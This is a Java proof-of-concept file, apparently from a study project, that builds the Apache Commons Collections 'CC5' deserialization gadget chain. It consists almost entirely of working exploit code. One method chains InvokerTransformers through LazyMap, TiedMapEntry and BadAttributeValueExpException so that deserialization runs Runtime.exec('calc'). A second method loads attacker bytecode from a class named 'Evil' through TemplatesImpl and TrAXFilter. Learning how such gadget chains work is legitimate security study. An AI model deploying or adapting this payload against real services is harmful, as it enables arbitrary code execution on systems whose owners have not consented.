package vuln;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import util.SerializeUtil;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

/**
 * 测试环境
 * jdk7
 * cc版本: 3.1
 * **/
public class Commoncollections5 {
    public static void main(String[] args) throws IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException, NotFoundException, CannotCompileException {
        vulncc5();
//        vulncc5Tocc3();
    }
    /**
     * cc5的调用链
     * ObjectInputStream.readObject()
     * BadAttributeValueExpException.readObject()
     * TiedMapEntry.toString()
     * TiedMapEntry.getValue()
     * LazyMap.get()
     * ChainedTransformer.transform()
     * ...
     * Runtime.exec()
     *
     * **/
    public static void vulncc5() throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        ChainedTransformer fakechain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });

        HashMap hashMap = new HashMap();
        Map decorateMap = LazyMap.decorate(hashMap, fakechain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,"aa");
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        SerializeUtil.setFieldValue(val,"val",tiedMapEntry);
        SerializeUtil.setFieldValue(decorateMap,"factory",chain);

        SerializeUtil.writeObjectToFile(val);
        SerializeUtil.readObjectToFile();
    }

    /**
     * cc5结合了cc3之后的
     * **/
    public static void vulncc5Tocc3() throws NotFoundException, NoSuchFieldException, IllegalAccessException, IOException, CannotCompileException, ClassNotFoundException {
        ChainedTransformer fakechain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("util.Evil");
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_name","aaa");
        SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{ctClass.toBytecode()});
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });
        HashMap hashMap = new HashMap();
        Map decorateMap = LazyMap.decorate(hashMap, fakechain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,"aa");
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        SerializeUtil.setFieldValue(val,"val",tiedMapEntry);
        SerializeUtil.setFieldValue(decorateMap,"factory",chainedTransformer);
//        hashMap.clear();

        SerializeUtil.writeObjectToFile(val);
        SerializeUtil.readObjectToFile();
    }


}
